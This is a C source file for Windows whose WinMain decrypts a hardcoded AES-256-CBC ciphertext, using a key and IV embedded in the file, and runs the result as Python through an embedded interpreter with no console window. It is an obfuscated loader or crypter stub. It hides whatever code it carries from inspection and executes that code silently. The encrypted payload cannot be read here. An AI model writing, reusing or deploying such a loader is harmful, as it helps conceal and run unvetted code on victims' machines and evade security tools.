#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/applink.c>
#include <python3.11/Python.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define AES_KEY_BITS 256
#define AES_IV_SIZE 16

void hex_to_string(const unsigned char *hex_array, size_t len, unsigned char *decoded_string) {
    if (len % 2 != 0) {
        printf("Error: hex_array length is not even.\n");
        return;
    }

    for (size_t i = 0; i < len / 2; i++) {
        sscanf((const char *)&hex_array[i * 2], "%2hhx", &decoded_string[i]);
    }
}

void decrypt_aes(const unsigned char *aes_key_hex, const unsigned char *aes_iv_hex, 
                  const unsigned char *input_hex, unsigned char **result, size_t *result_len) {
    unsigned char aes_key[AES_KEY_BITS / 8];
    unsigned char aes_iv[AES_IV_SIZE];
    
    hex_to_string(aes_key_hex, strlen((const char *)aes_key_hex), aes_key);
    hex_to_string(aes_iv_hex, strlen((const char *)aes_iv_hex), aes_iv);

    unsigned char input[20000];
    size_t input_len = strlen((const char *)input_hex) / 2;
    hex_to_string(input_hex, strlen((const char *)input_hex), input);

    unsigned char buffer[1024];
    unsigned char plaintext[1024 + EVP_MAX_BLOCK_LENGTH];
    EVP_CIPHER_CTX *ctx;
    int len, plaintext_len;
    size_t total_plaintext_len = 0;
    size_t buffer_size = sizeof(plaintext) * 2;
    unsigned char *full_plaintext = malloc(buffer_size);

    if (!full_plaintext) {
        perror("Unable to allocate memory");
        exit(EXIT_FAILURE);
    }

    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, aes_iv);

    const unsigned char *ptr = input;
    size_t remaining_len = input_len;

    while (remaining_len > 0) {
        size_t chunk_size = (remaining_len > sizeof(buffer)) ? sizeof(buffer) : remaining_len;
        memcpy(buffer, ptr, chunk_size);

        if (!EVP_DecryptUpdate(ctx, plaintext, &plaintext_len, buffer, chunk_size)) {
            ERR_print_errors_fp(stderr);
            exit(EXIT_FAILURE);
        }
        if (total_plaintext_len + plaintext_len > buffer_size) {
            buffer_size *= 2;
            full_plaintext = realloc(full_plaintext, buffer_size);
        }
        memcpy(full_plaintext + total_plaintext_len, plaintext, plaintext_len);
        total_plaintext_len += plaintext_len;

        ptr += chunk_size;
        remaining_len -= chunk_size;
    }

    if (!EVP_DecryptFinal_ex(ctx, plaintext, &plaintext_len)) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    memcpy(full_plaintext + total_plaintext_len, plaintext, plaintext_len);
    total_plaintext_len += plaintext_len;

    full_plaintext[total_plaintext_len] = '\0';
    EVP_CIPHER_CTX_free(ctx);

    *result = full_plaintext;
    *result_len = total_plaintext_len;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
    unsigned char aes_key_hex[] = "dc0e68af5e37726d7cf51a88c19028c202f249e9857978a5a0702ced91227327";
    unsigned char aes_iv_hex[] = "d48e8f872066162eabde33152dc604c6";
    unsigned char input_hex_py[] = "2eeafe63e0262d9ac74f40d9528c870716153e6fb07c157929ef8385d8c5e7582a05f596cf4b80e929d6ecf7fca05569130e4a1dd0e9b2a9489f4bebfb49f6b1544ec116a2d190713d9e73e232b69c672f26c6d4b725db4794aa44c78d76fae2a15881e80af05af95d2a37d3dd4ec6163e406f9c05814a9d3ccc6f0b0cccfbed2ab54f60f68023c7b67c434c15f2751d789ec6cda728d0c6d2d29b260a87b645360197cceb649d340b9c1eed71b7783addd5aa5a520c78ada512f23784f06fb179574a9f516fc3aea598bc765699cd7792ebf7c68ab5b30c5cb2f303184f635a1cb5f6dc28ab41035eba4cb6d1676c0a0c2d5edd480a971368e41a82de74eecf9c877b56c2ac5f61d3e37a05ad2ab245b0cd7e3acbb913aa5a8605ce14c01e6bc0d73cf5ced62c778ebf812501292047040b85b3f7aa8e130964f9cb357349c029535087873572da4fe21308b811bd891997140d4320eab2cf69ced2409ad4721de12b1fe7164d4b74fb7fd382deb0cd56003047eea90cdd1f56ffb670f33ab7f25be933bcb7b2914b1f7dc6e4e5201fe903de6a10bccf7abb8a77f488fd1ebd9ab0ce954f3673fc479ebe542f35632c152e9438f519775042044ef70e40f6ff349ec2c5fc3aebc48c5c60ef80e04586a319dfcd3151f6137b5e208615f39528622a64a2c434ef66eb2e556d6ddb0f6c124db7e84f526769e7b9911c390e569a5a01cefba213ac03dd2ff6317ccb79fdcb7980c38577db8d25e89f9edf2a67d1b8b52111ee18a180391f74d2559c230077d0829795f8c865a55aea3fdd4ddf18a7c42d4335f61e0ee14833fd26545bd7e6c4fa7dee3b7e7f0033e158dab1262bb087e25aa21b6d1fd9bf17869a520ee8a954913866b161f2a536f1ff4ce76d4fab5ef84a286f8b1b40f2226d72247f3699a0f6b614a54ac807c51c9d85dae45d69433eb3c9051d7ae708b6c9e306be9a1f00407aadec2427d8d86131caa4981e5ea7e5d8762824449e952352688c9c8ed00356a1b3be838e97ea2cdbad8cad7d7753d425d85488d753dd2ff16cd788f485f704932cabee39259093e85eca85b27072e62111369403559e44ff2fe885ad68b45a81dd2e0b5ecfa678e1df6b8466a150de3a46ac79c742e17016d06b0101ddf97342e48396ed19aea425ed4309d7155b0a0f6de2f7036da8bca437da685af2020414bd85c4f98cdd700a8d88b27729b0390e93787c7fa4945f93d8905441b6292dea8d0c24781f04b8440d628c090edb4456ea97194ddf751bd0110ee85a89c682c70e80b238d926d2d5dc98382a92f650ffcc6a5c87702c081cb0619a79126e301123e2c88354c213246406bc36c6ac5404125f0af0406c619e43b910ebbe23b361f9a58fb4c57f811dc44dd806d4ddbb9426be37c0105e68cc1e22bf679b293c6df9d5ba3a3f7886a22de5b6ce5cec9bc3d6bba4b7f6cafdc497885f4e5ad2477182093c228ddb788abc785bec42415d75d086cae8da896431d6dd3161d805cd0d9a0c20a4444f8fbb0d98872a21d9750411d9f84b96b2a39fa41961c4e407cdeefe184ad8a4fb6b41278bf02c375e01f8ea448ae70f13cf1bb39e34844dc9135223c9808a2f96fda0743fb7de04a6c32990aececac8ba7731a870878f0e352f755adc9d199706996861394c31e37094a086f2c5c5745bf5e589bc58246f110d7b21ebf59562fc782067ef4682ebe659163de684852ccd5dc1ce19fda9ea56613ca4220dd8cf766a10dcb609c0bb683d83b3f5127bd6e68234024674992d39e7be554d8fdffa8ff7f61ca42072770cd42d747920b542110693e78443ec15b98ace66f466254b85f22dd721981fe46ca0cbbc02947bbdab0229565ec90f82c4a5138e095f2cf91880a7a129c765c29c95b71ec120c9a8e5ab916a32a75228bb9d5856eb52566d90ac31384de364f76ce19825f25ad632c9d0d18d43a939f6c937d5fe96434bdb30a0f541218005996a8248a32d01609dfc6dd8fd634871967a31505b89be4265dab36c65a1805378f22097248d67e3f07a54db1830501c55d697db712ed9ad2370f44312e80fb0f77db1e2f947b50a707f3fcefead2a32b8561f948a265e6e3e1a6f70c56d75a2158251ee94a923c1b57bf4ff41c66e6d64be369f8aa34ac16b52f5755f0dc77975396b9cce7272b58ef4131cf368782d1a9b1b5978648aff42140cbb863333af05556648fbe40a377ff2892ad2c5fc1d5cf255f8cabe9864487a87f2014dbbd2451e9e7e4aa4fd9446fa6d8fa028f9cb00d3a4cc67add50c0d722d72ff825332ed8c50ce626c94530cc460e0d95fabf7f7589f9ad5483a4b0f9d7da769dc43967fd54c3e64f837eabdb331405e44b5cce1688551fa1e3334148f93072db78c77f9edbb387ba08a05aef4a3297b9cf2f62eb3b45f0675997b267d50a17566b9a6c7d399741f7da5858f87589d76029732e3aa8aa0457bb2f4683ff4c64365cd29834140937b4e081950266428cf4684c38d5b93c0242bba3c1fbca3925300bd73f7842ce7e0ae2fbebe8a5b6b357fcee5d9c8355b98f10b2d4cbbabc647f5a60b2912bea241a68d31841d084a7a1626ec2cba36074b5d386451f2c968d3a5f8b040d2248838a1b6fbae8088f145601af5561e2166bc44c2e93daae7f1d15cec13eca020c9fe4fabb33766d66515a005e07e3db9cdddaca6da71f19c4250e10ba77117b95b72651c10c8d0a51ca3705b07defd46c16e7308c3a26be49f87b030075c276e8da94858212e1708f58d0e4102ce36fa9c2f0226b7ea92c78816094a4346fad17805eeae9b6aa1c5f2cf06ddbd2beb07218638b59ea8c37afa155679add97faf0fc610879894a9b54aeb65807d16aa00231b0e83aedd7ac55c013774b15a718fd8b7debd130ee5088ca76f7975414953e24be04ab0bbe4a0064d31da58a77ec8f3c74825f1343a5aa0d9348b777308fccf1cccebd679bdd46d279c55d02e0934823c5a471955233cd6a07d805828a47ff78bdfea2ebfb34de8bab33402912003d5f918ef863a6cb09e72684db0b6ced4cf420afba786a36eb2991fa2bb923aa83c8a59aef1ac299607d35488b4bbff7ea0ed4f0ccc61437261570d039b44cc8389abe66d8d8f553cd899b42d22f2bfb28542c2f33f9dd40f3bf01f28eb8c12cdfcef9afb2674f5e51e6d04a6879f37b3878096ff9fbe9ee05642483282edcf8cb273c147aa879b0b5baf4ebafb09bad29bf311faa08860deb567cac99d6468a9662978ef9ef9b6760dc025dc47f87d177cbab41476b8938d3e12086197b71b955394d58f7ab2b3f080372f5f37b9838d61eaf1e765da22e2a96a6abb5da2a5797c24c222af6c5432bdc07371c412f83168b7dc999d76dca6e168d22055e7adbfaebdcada87abeefe501693ff74886bcc21d6263c09fcfef034f0e891db881e25843b2317e0927d88c9cc5582bb8bf9b02b88375cbafd7000aa771a2dc3f7e7f8e19ccb2f5e534c29e76d2e50946aaa603ff8ed46c7eaa12f3dfc81b3ce426dc53e05cc57adc6a69ffa51a004e2648848b21c20f8a164f10ac497e0732e86beb75129aca54e4e0dd4fd4faa31d52b6d1481de5f73c8e41b83c079125e8df024b23a3d63e6d3be0181d25edf5060";
    unsigned char *decrypted_text = NULL;
    size_t decrypted_len = 0;

    decrypt_aes(aes_key_hex, aes_iv_hex, input_hex_py, &decrypted_text, &decrypted_len);

    if (decrypted_text) {
        Py_Initialize();
        PyEval_InitThreads();

        PyGILState_STATE gstate = PyGILState_Ensure();
        PyRun_SimpleString((const char *)decrypted_text);

        PyGILState_Release(gstate);
        Py_Finalize();

        free(decrypted_text);
    }

    return 0;
}
